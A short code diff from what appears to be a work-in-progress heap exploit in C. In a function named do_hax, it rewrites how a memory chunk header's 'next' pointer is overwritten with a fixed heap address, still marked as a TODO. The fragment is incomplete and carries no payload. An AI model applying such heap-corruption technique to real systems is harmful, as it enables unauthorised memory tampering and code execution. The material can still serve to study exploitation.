@@ -3,7 +3,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define SLAB_HEAP 0xFFF70000
+#define SLAB_HEAP ((void*) 0xFFF70000)
 #define PAGE_SIZE 0x1000
 
 typedef struct {
@@ -82,7 +82,7 @@ void do_hax() {
     MemChunkHdr hdr = *(volatile MemChunkHdr*) memAddr;
 
     // Overwrite the header "next" pointer.
-    *(u32*) (memAddr + 4) = SLAB_HEAP; // TODO: destination
+    ((MemChunkHdr*) memAddr)->next = SLAB_HEAP; // TODO: destination
 
     // Output debug information.
     printf("\"Size\" value: %08X\n", (int) hdr.size);
